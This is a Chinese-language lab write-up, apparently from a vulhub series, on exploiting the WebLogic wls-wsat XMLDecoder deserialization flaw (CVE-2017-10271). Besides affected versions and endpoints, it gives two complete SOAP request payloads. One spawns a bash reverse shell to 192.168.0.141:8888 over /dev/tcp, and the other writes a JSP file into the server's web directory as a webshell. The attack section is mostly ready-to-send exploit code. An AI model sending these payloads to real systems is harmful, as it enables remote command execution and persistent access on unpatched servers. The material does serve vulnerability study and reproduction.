# Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）

###### by ADummy

### 0x00利用路线

​			burpsuite发包--->命令执行

### 0x01漏洞介绍			

​			Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令

##### 影响版本

```
10.3.6.0
12.1.3.0.0
12.2.1.1.0
```

##### 漏洞地址

/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType1

### 0x02漏洞复现

#### payload

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.0.141/8888 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

![Weblogic_XMLDecoder_反序列化漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Weblogic_XMLDecoder_反序列化漏洞_1.jpg)

反弹shell

![Weblogic_XMLDecoder_反序列化漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Weblogic_XMLDecoder_反序列化漏洞_2.jpg)

写入webshell（访问：`http://your-ip:7001/bea_wls_internal/test.jsp`）：

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

写入webshell

![Weblogic_XMLDecoder_反序列化漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Weblogic_XMLDecoder_反序列化漏洞_3.jpg)

### 0x03参考资料

https://blog.csdn.net/yumengzth/article/details/97522783